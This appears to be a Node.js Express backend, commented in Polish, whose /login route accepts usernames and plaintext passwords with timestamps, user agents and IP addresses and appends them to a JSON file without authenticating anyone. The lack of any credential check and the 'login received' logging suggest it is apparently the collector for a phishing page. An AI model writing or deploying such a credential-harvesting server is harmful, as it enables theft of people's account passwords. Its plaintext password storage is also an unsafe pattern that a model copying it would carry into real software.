const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());

// Zapisywanie danych logowania
app.post('/login', (req, res) => {
    const { username, password, timestamp, userAgent } = req.body;
    
    const logEntry = {
        username,
        password,
        timestamp,
        userAgent,
        ip: req.ip
    };
    
    // Zapis do pliku (na Renderze plik jest tymczasowy - lepiej użyć bazy danych)
    const logFile = path.join(__dirname, 'logins.json');
    let logs = [];
    
    if (fs.existsSync(logFile)) {
        try {
            logs = JSON.parse(fs.readFileSync(logFile));
        } catch(e) {}
    }
    
    logs.push(logEntry);
    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
    
    console.log('Otrzymano logowanie:', username);
    res.json({ status: 'ok' });
});

// Prosty endpoint testowy
app.get('/', (req, res) => {
    res.send('Backend działa!');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Serwer działa na porcie ${PORT}`);
});
